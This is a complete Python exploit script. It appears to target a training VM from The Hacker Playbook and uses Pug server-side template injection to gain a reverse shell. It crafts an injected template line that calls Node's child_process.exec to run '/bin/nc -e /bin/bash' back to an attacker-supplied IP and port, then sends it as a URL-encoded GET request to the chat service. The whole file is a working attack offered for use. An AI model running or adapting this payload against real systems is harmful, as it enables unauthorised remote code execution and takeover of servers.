#!/usr/bin/env python3.6

''' Uses Pug template injection to get reverse shell from The Hacker Playbook Chat Support Node VM. Uses format strings, so >=python3.6 is required.'''

import sys
import requests
from urllib import parse

if len(sys.argv) != 3:
    print("Usage: ./template_injection.py <attacker ip> <port>")
    sys.exit(1)

else:
    ip = sys.argv[1]
    port = sys.argv[2]

url = 'http://chat:3000/ti'

command = f"/bin/nc -e /bin/bash {ip} {port} 2> /opt/web/chatSupportSystems/public/error.txt"

injection = "\n-var x = global.process.mainModule.require"
injection += f"\n-x('child_process').exec('{command}')"

print(f"\n Crafted injection: \n {injection}\n")

injection = parse.quote(injection)

params = {'user':injection, 'comment':'', 'link':'HTTP/1.1'}
resp = requests.get(url, params=params)
